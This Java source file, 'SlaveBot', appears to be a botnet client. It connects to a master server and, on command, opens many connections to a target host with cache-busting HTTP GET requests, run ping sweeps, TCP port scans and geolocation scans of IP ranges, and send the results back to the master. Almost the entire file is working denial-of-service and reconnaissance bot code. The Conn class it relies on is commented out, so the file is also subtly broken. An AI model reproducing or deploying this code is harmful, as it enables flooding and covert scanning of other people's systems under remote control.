import java.io.BufferedReader;

	import java.util.ArrayList;
import java.util.regex.PatternSyntaxException;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
	import java.io.OutputStreamWriter;
	import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
    import java.net.Socket;
import java.net.URL;
import java.util.*;
	import java.text.*;

/*	
	class Conn{
	String 	Date;
	String 	Host;
	String 	Name;
	int	Port;
	Socket 	Sock;
	  Conn() {
		Date date = new Date();
		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd");
		String format = formatter.format(date);
		Date=format;
	  }
	}

*/
	public class SlaveBot {

	  public static ArrayList<Conn> List;
	  public static Socket Sock;
	  public static ArrayList<String> ipAdd = new ArrayList<String>();
	  public static ArrayList<Integer> targetPort = new ArrayList<Integer>();
		

	  public static void main(String[] args) throws Exception {
		  StringBuilder commaSeparatedValue = new StringBuilder();
			//ArrayList ipAdd = new ArrayList();
		if (args.length<4){
		  System.err.println("Error in the arguments ");
		 System.exit(-1);	
		}
	    	

		String hostName = "";
	    	String port = "";

		for (int t=0; t<3; t++){
			if (args[t].equals("-h")){ hostName=args[t+1];}
			else if (args[t].equals("-p")){ port=args[t+1];}
		}

	        if (hostName.equals("") || port.equals("")  ){	
		System.err.println("Error in the arguments ");
		System.exit(-1);
		}

	    List = new ArrayList<Conn>();
		try{
	    		Integer.parseInt(port);
		}
		catch (Exception e){
		System.err.println("port number should be integer.");
		System.exit(-1);
		}
	     Sock = new Socket(hostName, Integer.parseInt(port));
	    BufferedReader netIn = new BufferedReader(new InputStreamReader(Sock.getInputStream()));
	    //System.out.println("Connected to master and waiting for a command.");
	    Conn sockList;
	    while (true) {
		try{
	      String Line = netIn.readLine();
	      //System.out.println("Server Command : "+ Line);
	      if (Line !="") {
	      String[] serverCommand = Line.split(" ");
	      //System.out.println(serverCommand[0]);
	      Boolean keepAlive=false;
			String url="";
			int len_input=serverCommand.length;
		if(serverCommand[0].equals("connect")){
			if(serverCommand[1] != null && serverCommand[2]!= null && serverCommand[3]!= null){    	
				String targethostname = serverCommand[1];
			    	int Port = Integer.parseInt(serverCommand[2].toString());
				int num = Integer.parseInt(serverCommand[3].toString());
				Socket targetSocket;
				
				if(len_input > 4){
					if(serverCommand[4].equalsIgnoreCase("true")){
						keepAlive =true;
						}
					else if(serverCommand[4].equalsIgnoreCase("false")){
						keepAlive =false;
						}
					else {
						url = serverCommand[4].replace("url=", "");						
					}
				}
				for (int i=0; i< num; i++){
					      try {	
				    			targetSocket = new Socket(targethostname, Port);
							    sockList=new Conn();
							    sockList.Host=targetSocket.getInetAddress().getHostAddress();
							    sockList.Name=targetSocket.getInetAddress().getHostName();
							    sockList.Port=Port;
							    sockList.Sock=targetSocket;
							    List.add(sockList);
							System.out.println(" connection established with " + targethostname+" " + Port);
	            			//
							if (keepAlive) {
								targetSocket.setKeepAlive(true);
								System.out.println("keep alive*");
							}

							 if (url != "") {
								 String randomString = "";
								Random ran = new Random();
								int len = ran.nextInt(10) + 1;
								

								for (int j = 1; j <= len; j++) {
									int randomInteger = ran.nextInt(90-60+1)+65;
									char randomCharacter = (char) randomInteger;
									randomString = randomString + randomCharacter;
								}
								
								String outUrl = url + randomString;	
								BufferedWriter output = new BufferedWriter(new OutputStreamWriter(targetSocket.getOutputStream(), "UTF8"));
						           
								output.write("GET " + outUrl + "\r\n");
								output.write("\r\n");
								output.flush();
						        
						        String Response;
						        BufferedReader in = new BufferedReader(new InputStreamReader(targetSocket.getInputStream()));
						        while ((Response = in.readLine()) != null) {
						            System.out.println(Response);
						        }
						        
						        output.close();
						        in.close();
							 	
							 }} 
					      
					        
					      catch (Exception e) {
							System.out.println(" error establishing connection with " + targethostname+" " + Port);
						}
					      
				}
				System.out.println("Total connections are: "+List.size());
			}
			else{
				System.out.println(" illegal arguments for connect");
			}

		}
		else if(serverCommand[0].equals("disconnect")){
			if(serverCommand[1]!= null ){ 
		
				ArrayList<Conn> s = new ArrayList<Conn>();
				Iterator iterator = List.iterator();
				while (iterator.hasNext())
				{
				    Conn c = (Conn) iterator.next();
				    if(!s.contains(c)) s.add(c);
				}
				
				int ip=0;
				String target = serverCommand[1];

				if (target.matches("^(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}$") == true){ip=1; }
				else {	ip=0;}

			    	int Port=0;
				if(serverCommand[2]!= null ){			
					Port= Integer.parseInt(serverCommand[2].toString());
				}
				Iterator<Conn> it = s.iterator();
			      switch (ip) {
			       case 1:  
					while (it.hasNext()) {
					   Conn s1 = it.next();
						if(Port==0){
							if(s1.Host.equals(target)){
								s1.Sock.close();
								it.remove();
							}
						}
						else{
							if(s1.Host.equals(target) && s1.Port==Port){
								s1.Sock.close();
								it.remove();
							}
						}
					   
					}
					break;
			       case 0:  
					while (it.hasNext()) {
					   Conn s1 = it.next(); 
						if(Port==0){
							if(s1.Name.equals(target)){
								s1.Sock.close();
								it.remove();
							}
						}
						else{
							if(s1.Name.equals(target) && s1.Port==Port){
								s1.Sock.close();
								it.remove();
							}
						}
					   
					}
					break;
				}
				List=s;
						
			}
			else{
				System.out.println(" illegal arguments for disconnect");
			}	
		}
		
		else if(serverCommand[0].equals("ipscan"))
		{

			Scans ipscan = new Scans(1,Sock,serverCommand);
			Thread t1=new Thread(ipscan);
			t1.start();
			
	}//ipscan ends
		else if(serverCommand[0].equals("tcpportscan"))
		{
			Scans ipscan = new Scans(2,Sock,serverCommand);
			Thread t1=new Thread(ipscan);
			t1.start();
			



			//System.out.println(commaSeparatedValue.toString());
		
	}
		else if(serverCommand[0].equals("geoipscan")){
			Scans ipscan = new Scans(3,Sock,serverCommand);
			Thread t1 = new Thread(ipscan);
			t1.start();
			
		}
		
		
		else{
			 System.out.println(" invalid command " +  serverCommand[0]);
		}
		
		}//if ends
			}//try ends

			catch (Exception e) {
		      	e.printStackTrace();
			System.exit(-1);	    
	}
	    }//while ends

	  }
	 
	 
	  

	  }
	
	
class Scans extends Thread{
		int Type=0;
		Socket currentSocket=null;
		String message[]=null;
		ArrayList<String> ipAdd = new ArrayList<String>();
		ArrayList<Integer> targetPort = new ArrayList<Integer>();
		StringBuilder commaSeparatedValue = new StringBuilder();
		Scans(int opr,Socket s, String m[]){
			Type=opr;
			currentSocket = s;
			message=m;
		}
		
		public void run(){
			
			if(Type==1){
				ipScan(1);
			}
			if(Type==2){
				tcpScan();
			}
			if(Type==3){
				ipScan(2);
			}
			
		}

		private void tcpScan() {
			String Target_name=message[1];
			String portRange = message[2];
			String[] portParts = portRange.split("-");
		
			int first = Integer.parseInt(portParts[0]);
			int last = Integer.parseInt(portParts[1]);

			for (int i = first; i <= last; i++) 
			{
				int Port_value = i ;
				boolean abc = PortRange(Target_name, Port_value);
				
				if(abc)
				{
					targetPort.add(Port_value);

				}
			}
			
			for ( int j = 0; j< targetPort.size(); j++)
			{
				
				commaSeparatedValue.append(targetPort.get(j));

				if ( j != targetPort.size()-1)
				{
					commaSeparatedValue.append(", ");
				}
			}
			
			PrintWriter netOut;
			try {
				netOut = new PrintWriter(new OutputStreamWriter(currentSocket.getOutputStream()));
				netOut.println(commaSeparatedValue.toString());
			    netOut.flush();
			}
			catch (IOException e) {
				
				System.err.println("Unable to establish connection to master");
			}

			
		}

		private void ipScan(int oprType) {
			
			try{
				String ipRange[]=message[1].split("-");;
				String start = ipRange[0];
				String end = ipRange[1];

				if(!validIP(start)){
					System.out.println("Invalid start IP range\n");
					return;
				}
				if(!validIP(end)){
					System.out.println("Invalid end IP range\n");
					return;
				}
				
				while(!end.equals(start)){
					
					if(ipPing(start)){
						
						if(oprType==1)
							ipAdd.add(start);
						if(oprType==2)
							ipAdd.add(start+" "+getHTML("http://ip-api.com/line/"+start));
							
					}				
					start=nextAddress(start);
				}
				if(ipPing(end)){
					if(oprType==1)
						ipAdd.add(end);
					if(oprType==2)
						ipAdd.add(end+" "+getHTML("http://ip-api.com/line/"+end));
				}
				
			}
			catch(ArrayIndexOutOfBoundsException e){
				System.out.println("Invalid IP range\n");
				return;
			}
			catch(PatternSyntaxException e){
				System.out.println(" Invalid IP\n ");
				return;
			}
			catch(NumberFormatException e){
				System.out.println(" Invalid IP\n ");
				return;
			} catch (Exception e) {
				System.out.println(" Unable to perform geoScan\n ");
				e.printStackTrace();
				return;
			}
			
			
			
			
			for ( int j = 0; j< ipAdd.size(); j++)
			{
				
				commaSeparatedValue.append(ipAdd.get(j));

				if ( j != ipAdd.size()-1)
				{
				    if(oprType==1)
					   commaSeparatedValue.append(", ");
                    if(oprType==2)
					   commaSeparatedValue.append("\n");
				}
			}
			 

			PrintWriter netOut;
			try {
				netOut = new PrintWriter(new OutputStreamWriter(currentSocket.getOutputStream()));
				netOut.println(commaSeparatedValue.toString());
			    netOut.flush();
			} 
			catch (IOException e) {
				
				System.err.println("Unable to send data to master");
			}


			//System.out.println(commaSeparatedValue.toString());
		

			
		}
		
		  private  boolean PortRange(String Target_name, int Port_value)
		  {
			  boolean result = true;
			         try {
			            Socket socket = new Socket();
			            socket.connect(new InetSocketAddress(Target_name, Port_value), 1000);
			            socket.close();
			           // System.out.println("Port " + port + " is open");
			            
			        } catch (Exception ex) {
			        	result = false;
			        }
			         return(result); 
			      
		  }
		  
			private static String nextAddress(String ip) {
			    String[] numbers = ip.split("\\.");
			    int i = (Integer.parseInt(numbers[0]) << 24 | Integer.parseInt(numbers[2]) << 8
			          |  Integer.parseInt(numbers[1]) << 16 | Integer.parseInt(numbers[3])) + 1;

			    // If you wish to skip over .255 addresses.
			    if ((byte) i == -1) i++;

			    return String.format("%d.%d.%d.%d", i >>> 24 & 0xFF, i >> 16 & 0xFF,
			                                        i >>   8 & 0xFF, i >>  0 & 0xFF);
			}
			
			private static boolean ipPing(String ip){
				
				boolean ping=true;
				try {		
			        String stringCommand = "";
			        if(System.getProperty("os.name").startsWith("Windows")) {
			            //  command for Windows Operating system
			            stringCommand = "ping -n 1 " + ip;
			        } else {
			            //  command for Linux and OSX
			            stringCommand = "ping -c 1 " + ip;
			        }
					Runtime r = Runtime.getRuntime();
					Process process = r.exec(stringCommand);
					String pingResult = null;
					BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
				    
				    while ((pingResult = stdInput.readLine()) != null)
				    {
				    	if(pingResult.contains("100.0% packet loss") || pingResult.contains("100% loss") || pingResult.contains("100% packet loss")){
				    		ping=false;
				    	}
				    }
			
				    stdInput.close();
		       	} catch (IOException e) {
					return false;
		       	}
				return ping;
				
			}//END of ipPing
			
			public static boolean validIP (String ip) {
			    try {
			        if ( ip == null || ip.isEmpty() ) {
			            return false;
			        }

			        String[] parts = ip.split( "\\." );
			        if ( parts.length != 4 ) {
			            return false;
			        }

			        for ( String s : parts ) {
			            int i = Integer.parseInt( s );
			            if ( (i < 0) || (i > 255) ) {
			                return false;
			            }
			        }
			        if ( ip.endsWith(".") ) {
			            return false;
			        }

			        return true;
			    } catch (NumberFormatException nfe) {
			        return false;
			    }
			}
		
			private static String getHTML(String urlToRead) throws Exception {
			      StringBuilder result = new StringBuilder();
			      int count=0;
			      URL url = new URL(urlToRead);
			      HttpURLConnection conn = (HttpURLConnection) url.openConnection();
			      conn.setRequestMethod("GET");
			      BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
			      String line;
			      while ((line = rd.readLine()) != null) {
				    	 
			    	  if(line.contains("fail")){
			    		  result.append("");
			    		  break;	    		  
			    	  }
			    	  if(count!=0 && count!=2 &&count!=3 && count!=9 && count!=13 && count!=11 && count!=12){
			    		  result.append(line+", ");
			    	  }
			    	  if(count==12){
			    		  result.append(line+"");
			    	  }
			    	  count++;
			      }
			      rd.close();
			      return result.toString();
			   }
			
	}	